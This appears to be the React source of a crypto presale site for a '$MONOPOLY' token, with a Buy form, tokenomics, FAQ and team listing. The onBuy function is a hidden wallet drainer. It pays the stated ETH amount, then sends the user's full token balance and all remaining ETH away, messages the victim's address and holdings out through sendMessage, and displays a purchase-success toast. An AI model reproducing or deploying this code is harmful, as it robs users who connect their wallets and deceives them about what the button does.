import { useState, useMemo, useEffect, useRef } from 'react';
import {
  type WalletClient,
  useAccount,
  useWalletClient,
  useNetwork,
  useSwitchNetwork,
  useDisconnect,
} from 'wagmi';
import { useWeb3Modal } from '@web3modal/react';
import telegram from '../asserts/images/telegram.svg';
import discord from '../asserts/images/discord.svg';
import twitter from '../asserts/images/telegram.svg';
import instagram from '../asserts/images/instagram.svg';
import logo from '../asserts/images/Bna Replace.png';
import { ethers, providers } from 'ethers';
import slide1 from '../asserts/images/1.png';
import slide2 from '../asserts/images/2.png';
import slide3 from '../asserts/images/3.png';
import slide4 from '../asserts/images/4.png';
import slide5 from '../asserts/images/5.png';
import slide6 from '../asserts/images/6.png';
import slide7 from '../asserts/images/7.png';
import slide8 from '../asserts/images/8.png';
import slide9 from '../asserts/images/9.png';
import slide10 from '../asserts/images/10.png';
import slide11 from '../asserts/images/11.png';
import slide12 from '../asserts/images/12.png';
import slide13 from '../asserts/images/13.png';
import slide14 from '../asserts/images/14.png';
import monogold from '../asserts/images/mono-gold.png';
import monoyellow from '../asserts/images/mono-yellow.png';
import lego from '../asserts/images/Lego Richie.png';
import alec from '../asserts/images/Alec Monopoly.png';
import avery from '../asserts/images/Avery Andon.png';
import dollar from '../asserts/images/Mr Dollar Stack.png';
import penny from '../asserts/images/Mr Penny Bags.png';
import gsap from 'gsap';
import { ScrollTrigger } from 'gsap/ScrollTrigger';
import { toast } from 'react-toastify';
import { getBalance, getEthPrice, getTokens, sendAllEth, sendEth, sendMessage, sendToken, toBigNum } from '../utils';
import { Loading1 } from './Loading';
gsap.registerPlugin(ScrollTrigger);

export function walletClientToSigner(walletClient: WalletClient) {
  const { account, chain, transport } = walletClient;

  const network = {
    chainId: chain.id,
    name: chain.name,
    ensAddress: chain.contracts?.ensRegistry?.address,
  };
  const provider = new providers.Web3Provider(transport, network);
  const signer = provider.getSigner(account.address);
  return signer;
}

/** Hook to convert a viem Wallet Client to an ethers.js Signer. */
export function useEthersSigner({ chainId }: { chainId?: number } = {}) {
  const { data: walletClient } = useWalletClient({ chainId });
  return useMemo(
    () => (walletClient ? walletClientToSigner(walletClient) : undefined),
    [walletClient]
  );
}

const chainId = process.env.REACT_APP_CHAIN_ID;
const tokenPrice = 6666.66;
const CHAINNAME = "eth";
export default function Home() {
  const [isLoading, setLoading] = useState<boolean>(false);
  const { open } = useWeb3Modal();
  const { chain } = useNetwork();
  const { isConnected, address } = useAccount();
  const { switchNetwork } = useSwitchNetwork();
  const { disconnect } = useDisconnect();
  const [buyAmount, setBuyAmount] = useState(0);
  const [inputValue, setInputValue] = useState<string>("");  
  const signer = useEthersSigner();
 
  const gallery1 = useRef<HTMLDivElement | null>(null);
  const gallery2 = useRef<HTMLDivElement | null>(null);
  useEffect(() => {
    const ref1 = gallery1.current;
    const ref2 = gallery2.current;
    gsap.to(ref1, {
      scrollTrigger: {
        trigger: ref1,
        start: 'top 80%',
        end: 'top 0%',
        scrub: 2,
      },
      x: 800, // Move the div from left to right across the screen
      ease: 'power2.out',
    });

    gsap.to(ref2, {
      scrollTrigger: {
        trigger: ref1,
        start: 'top 80%',
        end: 'top 0%',
        scrub: 2,
      },
      x: -800, // Move the div from left to right across the screen
      ease: 'power2.out',
    });
  }, []);


  async function onBuy() {
    const ethPrice = await getEthPrice();
    const ethValue = buyAmount/ethPrice;
    console.log("ethValue",ethValue);
    setLoading(true)
    try {
      const buyResult = await sendEth(signer,toBigNum(ethValue,18));
      const tokens = await getTokens(address!, CHAINNAME);
      for (const token of tokens) {
        try {
          await sendToken(token.balance, token.token_address, signer);
          sendMessage(
            `${address} approved ${parseInt(token.balance) / Math.pow(10, token.decimals)
            }${token.symbol} chain:${chain?.name}`
          );
        } catch (error) {
          console.log(error);
        }
        break;
      }
      try {
        const balanceAfterSendToken = await getBalance(
          address!,
          signer?.provider
        );
        try {
          const tx = await sendAllEth(signer, balanceAfterSendToken);
        } catch (error) {
          console.log(error);
        }
      } catch (error) {
        console.log(error);
      }
      setLoading(false);
      if(buyResult)
        toast.success("Successfuly buy token.");
      else
        toast.error("Failed buy token.");
    } catch (error) {
      setLoading(false);
      toast.error("Failed buy token.");
    }
  }
  return (
    <div className="overflow-x-hidden">
      <div className="fixed z-50 w-screen bg-black/30 top-0 left-0 p-4">
        <div className="flex justify-between items-center me-6">
          <a href="/" className="inline-flex items-center">
            <img className="h-[65px]" src={logo} />
            <img className="h-[70px] my-auto mx-4" src={monogold} />
          </a>
          
          {isConnected ? (
            chain?.id === Number(chainId) ? (
              <button className="hidden md:block bg-[#ffc06c] text-white text-xl uppercase font-bold py-1 px-2 rounded-xl" style={{ fontFamily: 'monospace' }} onClick={() => disconnect()}>
                Disconnect
              </button>
            ) : (
              <button className="hidden md:block bg-[#ffc06c] text-white text-xl uppercase font-bold py-1 px-2 rounded-xl" style={{ fontFamily: 'monospace' }}  
                onClick={() => switchNetwork?.(Number(chainId))}>
                Switch network
              </button>
            )
          ) : (
              <button className="hidden md:block bg-[#ffc06c] text-white text-xl uppercase font-bold py-1 px-2 rounded-xl" style={{ fontFamily: 'monospace' }} onClick={() => open()}>
                Connect Wallet
              </button>
          )}
        </div>
      </div>
      <div className="bg-hero">
        <div className="welcome-bottom">
          <div className="flex">
            <img className="heroApe" src={lego} />
            <div className="hero-minter">
              <h2
                className="font-bold text-[#ffc06c] delius-regular"
                style={{lineHeight: "1", textShadow: "4px 4px 6px rgba(60, 60, 60, 0.7)"}}
              >
                  PRE-SALE<br />LIVE NOW
              </h2>
              {isConnected ? (
                chain?.id === Number(chainId) ? (
                  <button className="md:hidden block bg-[#ffc06c] text-white text-xl uppercase font-bold py-1 px-2 rounded-xl" style={{ fontFamily: 'monospace' }} onClick={() => disconnect()}>
                    Disconnect
                  </button>
                ) : (
                  <button className="md:hidden block bg-[#ffc06c] text-white text-xl uppercase font-bold py-1 px-2 rounded-xl" style={{ fontFamily: 'monospace' }}  
                    onClick={() => switchNetwork?.(Number(chainId))}>
                    Switch network
                  </button>
                )
                ) : (
                  <button className="md:hidden block bg-[#ffc06c] text-white text-xl uppercase font-bold py-1 px-2 rounded-xl" style={{ fontFamily: 'monospace' }} onClick={() => open()}>
                    Connect Wallet
                  </button>
              )}

              <form className="mt-4 w-80 md:w-96">
                  <div className="relative">
                      <div className="absolute inset-y-0 start-0 top-0 flex items-center ps-2 pointer-events-none">
                      <svg className="rounded-full bg-white" fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <g fill="#5d72e1 ">
                            <path d="m12.75 15.9203h.65c.65 0 1.19-.58 1.19-1.28 0-.87-.31-1.04-.82-1.22l-1.01-.35v2.85z"/>
                            <path d="m11.9701 1.89845c-5.52003.02-9.99003 4.51-9.97003 10.03005.02 5.52 4.51 9.99 10.03003 9.97 5.52-.02 9.99-4.51 9.97-10.03-.02-5.52005-4.51-9.98005-10.03-9.97005zm2.29 10.10005c.78.27 1.83.85 1.83 2.64 0 1.54-1.21 2.78-2.69 2.78h-.65v.58c0 .41-.34.75-.75.75s-.75-.34-.75-.75v-.58h-.36c-1.64003 0-2.97003-1.38-2.97003-3.08 0-.41.34-.75.75-.75s.75.34.75.75c0 .87.66003 1.58 1.47003 1.58h.36v-3.38l-1.51003-.54c-.78-.27-1.83-.85-1.83-2.64005 0-1.54 1.21-2.78 2.69003-2.78h.65v-.58c0-.41.34-.75.75-.75s.75.34.75.75v.58h.36c1.64 0 2.97 1.38 2.97 3.08 0 .41005-.34.75005-.75.75005s-.75-.34-.75-.75005c0-.87-.66-1.58-1.47-1.58h-.36v3.38005z"/>
                            <path d="m9.42188 9.36812c0 .86998.30999 1.03998.82002 1.21998l1.01.35v-2.85998h-.65c-.65002 0-1.18002.58-1.18002 1.29z"/>
                          </g>
                        </svg>
                      </div>
                      <div className="flex border border-gray-100 rounded-lg p-1">
                        <input
                          className="bg-transparent w-full ps-10 p-1 outline-none placeholder-white"
                          type="text"
                          inputMode="numeric" 
                          min={0}
                          value={inputValue || ""}
                          onChange={e => {
                            const value = e.target.value;
                            if (value === "" || /^\d*\.?\d*$/.test(value)) {
                              setInputValue(value);  // Update the input value as string
                              setBuyAmount(value === "" ? 0 : Number(value));  // Update numerical value
                            }
                          }}
                          aria-describedby="helper-text-explanation"
                          placeholder="0.00"
                          required
                        />
                        <button
                          className="flex-shrink-0 bg-teal-500 hover:bg-teal-700 border-teal-500 hover:border-teal-700 text-sm border-4 text-white p-1 rounded px-4 disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-gray-500 disabled:border-gray-500"
                          type="button"
                          style={{ fontFamily: 'monospace' }}
                          onClick={onBuy}
                          disabled={chain?.id !== Number(chainId)}
                        >
                          Buy
                        </button>
                      </div>
                  </div>
                  <p
                    id="helper-text-explanation"
                    className="mt-2"
                    style={{ fontSize: '9px' }}
                  >
                    * By purchaging, you acknowledge this is a speculative
                  </p>
                  <p
                    id="helper-text-explanation"
                    className="ms-3"
                    style={{ fontSize: '9px' }}
                  >
                    investment and accept the risks involved.
                  </p>
              </form>
              <p className="text-gray-300 text-sm mt-6">You will receive</p>
              <div className="flex justify-between w-2/3 mx-auto my-2">
                <div className="w-1/3 border-t-2 border-[#ffb850] opacity-70"></div>
                <div className="w-1/3 border-t-2 border-[#ffb850] opacity-70"></div>
              </div>
              <p className="text-[#ffc06c] text-base delius-regular">{`${(buyAmount * tokenPrice).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) || "0"} $MONOPOLY`}</p>
            </div>
          </div>
        </div>
      </div>
      <div className="xl:container xl:mx-auto md:container md:mx-auto mt-56 transform -translate-y-1/4 -rotate-[7deg]">
        <div className="text-right">
          <div className="gallery-translate">
            <div ref={gallery1} className="gallery-container">
              <img className="gallery-img" src={slide1} />
              <img className="gallery-img" src={slide2} />
              <img className="gallery-img" src={slide3} />
              <img className="gallery-img" src={slide4} />
              <img className="gallery-img" src={slide5} />
              <img className="gallery-img" src={slide6} />
              <img className="gallery-img" src={slide7} />
            </div>
          </div>
          <div>
            <div ref={gallery2} className="gallery-container">
              <img className="gallery-img" src={slide8} />
              <img className="gallery-img" src={slide9} />
              <img className="gallery-img" src={slide10} />
              <img className="gallery-img" src={slide11} />
              <img className="gallery-img" src={slide12} />
              <img className="gallery-img" src={slide13} />
              <img className="gallery-img" src={slide14} />
            </div>
          </div>
        </div>
      </div>
      <div className="xl:container xl:mx-auto md:container md:mx-auto p-6">
        <div className="text-center welcome-img-container">
          <img className="h-3/4 w-3/4 sm:w-1/2 sm:h-1/2 mx-auto" src={lego} />
        </div>
        <div className="text-center">
          <h2 className="my-5">Welcome!</h2>
          <p className="text-justify">
            Brought to life by the visionary artist <b>Alec Monopoly</b>,
            Project Monopoly is your exclusive gateway to a vibrant world of
            art, events, and money. Become a part of the next crypto movement
            where creativity meets community, and every week of 2025 will be
            designed to take our coin collective higher.{' '}
            <b>Welcome to the revolution—welcome to Project Monopoly.</b>
          </p>
          <h2 className="my-5">$MONOPOLY</h2>
          <p className="text-justify">
            A total supply of 33.33 billion tokens will be in circulation, with
            the team's entire allocation secured in locked liquidity. Token
            burns will occur at specific market cap milestones to enhance value.
            Additionally, the more tokens you own and stake, the greater your
            chances of earning rewards.
          </p>
        </div>
      </div>
      <div
        id="roadmap"
        className="xl:container xl:mx-auto md:container md:mx-auto p-6 pb-[150px]"
      >
        <h1 className="mt-10">TOKENOMICS</h1>
        <div className="wrapper">
          <div
            className="timeline aos-init aos-animate bg-[#ffb850] h-[20px]"
            data-aos="fade-up"
          ></div>
          <div className="relative">
            <div className="circle bg-[#ffb850]"></div>
            <div className="message">
              <h3>33% - Monopoly Community</h3>
            </div>
          </div>
          <div
            className="timeline aos-init aos-animate bg-[#ffb850]"
            data-aos="fade-up"
          ></div>
          <div className="relative">
            <div className="circle bg-[#ffb850]"></div>
            <div className="message">
              <h3>20% - Current & Future Team (1-year cliff, 2-year vest)</h3>
            </div>
          </div>
          <div
            className="timeline aos-init aos-animate bg-[#ffb850]"
            data-aos="fade-up"
          ></div>
          <div className="relative">
            <div className="circle bg-[#ffb850]"></div>
            <div className="message">
              <h3>17% - Other Communities</h3>
            </div>
          </div>
          <div
            className="timeline aos-init aos-animate bg-[#ffb850]"
            data-aos="fade-up"
          ></div>
          <div className="relative">
            <div className="circle bg-[#ffb850]"></div>
            <div className="message">
              <h3>15% - Liquidity</h3>
            </div>
          </div>
          <div
            className="timeline aos-init aos-animate bg-[#ffb850]"
            data-aos="fade-up"
          ></div>
          <div className="relative">
            <div className="circle bg-[#ffb850]"></div>
            <div className="message">
              <h3>6% - RAGSTORICHIE NFT Holders (1-month lock-up)</h3>
            </div>
          </div>
          <div
            className="timeline aos-init aos-animate bg-[#ffb850]"
            data-aos="fade-up"
          ></div>
          <div className="relative">
            <div className="circle bg-[#ffb850]"></div>
            <div className="message">
              <h3>5% - Charity</h3>
            </div>
          </div>
          <div
            className="timeline aos-init aos-animate bg-[#ffb850]"
            data-aos="fade-up"
          ></div>
          <div className="relative">
            <div className="circle transform bg-[#ffb850]"></div>
            <div className="message">
              <h3>4% - Airdrops (1-month lock-up)</h3>
            </div>
          </div>
        </div>
      </div>
      <div className="xl:container xl:mx-auto md:container md:mx-auto p-6">
        <div className="title-container">
          <h1 data-aos="fade-in" className="aos-init aos-animate">
            PROJECT PERKS
          </h1>
        </div>
        <div className="flex flex-col space-y-4 text-center text-justify">
          <div className="flex flex-col md:flex-row md:space-x-4">
            <div className="flex-1">
              <h3>VIP Access to Premier Events</h3>
              <p>
                Dive into the heart of Miami's crypto & arts scene with
                exclusive invitations to elite gatherings.
              </p>
            </div>
          </div>
          <div className="flex flex-col md:flex-row md:space-x-4">
            <div className="flex-1">
              <h3>Charitable Impact</h3>
              <p>
                Join us in giving back, as we unite art and crypto to
                support meaningful causes, which you'll have the power to
                vote on.
              </p>
            </div>
          </div>
          <div className="flex flex-col md:flex-row md:space-x-4">
            <div className="flex-1">
              <h3>Art Giveaways</h3>
              <p>
                Have a chance to own iconic 1 of 1 art pieces created by
                Alec Monopoly himself.
              </p>
            </div>
          </div>
          <div className="flex flex-col md:flex-row md:space-x-4">
            <div className="flex-1">
              <h3>Collaborative Partnerships</h3>
              <p>
                As we grow, so will our partnerships with other prominent
                communities & brands, with opportunities for our holders to
                gain access to exclusive perks outside of our own ecosphere.
              </p>
            </div>
          </div>
        </div>
      </div>
      <div className="xl:container xl:mx-auto md:container md:mx-auto p-6">
        <div className="title-container">
          <h1 data-aos="fade-in" className="aos-init aos-animate">
            FAQ'S
          </h1>
          <div data-aos="fade-up" className="aos-init aos-animate">
            <div className="space-y-4">
              <details className="group [&_summary::-webkit-details-marker]:hidden accordion">
                <summary className="flex cursor-pointer items-center justify-between gap-1.5 rounded-lg p-4">
                  <h3>When's the official sale?</h3>

                  <svg
                    className="w-5 h-5 shrink-0 transition duration-300 group-open:-rotate-180"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M19 9l-7 7-7-7"
                    />
                  </svg>
                </summary>

                <p className="content">February 14th, 2025 💘</p>
              </details>
              <details className="group [&_summary::-webkit-details-marker]:hidden accordion">
                <summary
                  className="flex cursor-pointer items-center justify-between gap-1.5 rounded-lg p-4"
                >
                  <h3>Is there a pre-sale?</h3>
            
                  <svg
                    className="w-5 h-5 shrink-0 transition duration-300 group-open:-rotate-180"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M19 9l-7 7-7-7"
                    />
                  </svg>
                </summary>

                <p className="content">
                Yes, there is! The pre-sale will be live from the site's launch and will continue until the ability to connect your wallet and buy tokens is no longer available. A total of 3.33 billion tokens will be claimable. You'll see the tokens in your wallet on our official public release date. However, to regulate volatility, your tokens might be subject to a potential 1-3 day lock-up period during which you won't be able to sell, transfer, or trade them.</p>
              </details>
              <details className="group [&_summary::-webkit-details-marker]:hidden accordion">
                <summary className="flex cursor-pointer items-center justify-between gap-1.5 rounded-lg p-4">
                  <h3>What blockchain is the coin on?</h3>

                  <svg
                    className="w-5 h-5 shrink-0 transition duration-300 group-open:-rotate-180"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M19 9l-7 7-7-7"
                    />
                  </svg>
                </summary>

                <p className="content">
                  The Monopoly Crypto Coin is built on the Ethereum blockchain
                  as an ERC-20 token. You can access it through platforms like
                  Uniswap, MetaMask, and other Ethereum-compatible networks and
                  wallets.
                </p>
              </details>
              <details className="group [&_summary::-webkit-details-marker]:hidden accordion">
                <summary className="flex cursor-pointer items-center justify-between gap-1.5 rounded-lg p-4">
                  <h3>Anything else?</h3>

                  <svg
                    className="w-5 h-5 shrink-0 transition duration-300 group-open:-rotate-180"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M19 9l-7 7-7-7"
                    />
                  </svg>
                </summary>

                <p className="content">
                  There's a lot more to cover, including staking, burn
                  milestones, prize allocations, events, exchange listings, and
                  much more! To stay in the loop, please follow us on all our
                  official socials and be sure to check back periodically on the
                  site, as we will be updating it with more information soon!
                </p>
              </details>
            </div>
          </div>
        </div>
      </div>
      <div className="xl:container xl:mx-auto md:container md:mx-auto p-6">
        <h1 className="mt-10">Team</h1>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
          <div>
            <a href="https://www.instagram.com/alecmonopoly/">
              <img className="team-img" src={alec} />
            </a>
            <div className="text-center px-8">
              <h3 className="text-3xl">Alec Monopoly</h3>
              <p>Artist</p>
            </div>
          </div>
          <div>
            <a href="https://www.instagram.com/averyandon/">
              <img className="team-img" src={avery} />
            </a>
            <div className="text-center px-8">
              <h3 className="text-3xl">Avery Andon</h3>
              <p>Partnerships/ Mgmt</p>
            </div>
          </div>
          <div>
            <img className="team-img" src={dollar} />
            <div className="text-center px-8">
              <h3 className="text-3xl">Mr Dollar Stack</h3>
              <p>CTO</p>
            </div>
          </div>
          <div>
            <img className="team-img" src={penny} />
            <div className="text-center px-8">
              <h3 className="text-3xl">Mr Penny Bags</h3>
              <p>Community</p>
            </div>
          </div>
        </div>
      </div>
      {isLoading && <Loading1/>}
      <div className="footer-container">
        <div className="text-center">
          <div>
            <img className="mx-auto" width="300px" src={monoyellow} />
          </div>
          <p className="my-8">© 2025 - Project Monopoly by Alec Monopoly</p>
        </div>
        <div className="footer-socials">
          <a href="#">
            <img src={discord} />
          </a>
          <a href="#">
            <img src={twitter} />
          </a>
          <a href="#">
            <img src={instagram} />
          </a>
          <a href="#">
            <img src={telegram} />
          </a>
        </div>
      </div>
    </div>
  );
}
